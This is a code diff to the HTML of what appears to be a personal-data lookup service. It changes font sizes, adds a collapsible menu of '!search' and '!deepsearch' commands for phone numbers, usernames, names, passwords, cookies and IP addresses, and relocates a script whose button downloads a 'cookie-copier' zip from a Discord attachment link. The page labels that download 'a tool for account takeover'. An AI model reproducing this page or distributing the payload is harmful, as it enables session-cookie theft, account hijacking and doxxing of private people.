@@ -163,7 +163,7 @@
 
       <div class="msg-bubble">
         <div class="msg-info">
-<div class="msg-info-name" style="font-size:1.7em; font-weight:600;">
+<div class="msg-info-name" style="font-size:2.25em; font-weight:600;">
   Available Commands
 </div>
           <div class="msg-info-time"></div>
@@ -171,7 +171,13 @@
 
         <div class="msg-text" style="font-size:1.30em; line-height:1.4;">
    Below are some example queries you can use to begin searching and exploring available data<br><br>
-          
+
+                    <div class="command-dropdown">
+  <div id="dropdownHeader" class="dropdown-header">
+    List available command catalog <span id="dropdownArrow">^</span>
+  </div>
+  <div id="dropdownContent" class="dropdown-content">      
+    
   <strong>Basic</strong><br>
   [!search Number (Phonenumber)]<br>        
   [!search User (Username)]<br> 
@@ -180,22 +186,11 @@
   [!search Name (Full_Name)]<br>
   [!search Password (Password)]<br>
   [!search Cookie (Cookie)]<br>
+  <div class="cookie-btn-row">
  <button class="install-cookie-btn" onclick="downloadCookieCopier()">Install cookie-copier</button>
  <button class="use-cookie-btn" onclick="window.location.href='/../cookie-copier.html'">
-    cookie-copier setup</button><br>
+    cookie-copier setup</button></div>
  <p>A tool for account takeover</p><br>
- 
- <script>
-  function downloadCookieCopier() {
-    const url = "https://cdn.discordapp.com/attachments/1542213282600059043/1542280905643659274/cookie-copier.zip?ex=6a90a886&is=6a8f5706&hm=f973eeedfb46d6dff87da6335f1bbb8b2a398c4e8bb720c50bcbf6947babde02&";
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "cookie-copier.zip";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-  }
-</script>
 
   <strong>DeepSearch (current)</strong><br>
   [!deepsearch User (Username)]<br>
@@ -205,8 +200,36 @@
   [!deepsearch IP (Public_IP_Address)]<br>
   [!deepsearch Name (Full_Name)]<br><br>
 
-  Combining queries or specifying a site of choice may result to finding more information.<br>
+  Combining queries or specifying a site of choice may result to finding more information.<br>        
   <strong>Example:</strong> !search/deepsearch User User123 <strong>&</strong> Email Example@gmail.com<br><br>
+  
+  </div>
+</div>
+
+<script>
+document.getElementById("dropdownHeader").addEventListener("click", () => {
+  const content = document.getElementById("dropdownContent");
+  const arrow = document.getElementById("dropdownArrow");
+
+  if (content.style.display === "block") {
+    content.style.display = "none";
+    arrow.textContent = "^";
+  } else {
+    content.style.display = "block";
+    arrow.textContent = ">";
+  }
+});
+
+function downloadCookieCopier() {
+  const url = "https://cdn.discordapp.com/attachments/1542213282600059043/1542280905643659274/cookie-copier.zip?ex=6a90a886&is=6a8f5706&hm=f973eeedfb46d6dff87da6335f1bbb8b2a398c4e8bb720c50bcbf6947babde02&";
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "cookie-copier.zip";
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+</script>
 
           <h3><strong>Our Socials</strong></h3>
           <button id="go-post-error" class="msger-send-btn">Instagram</button>
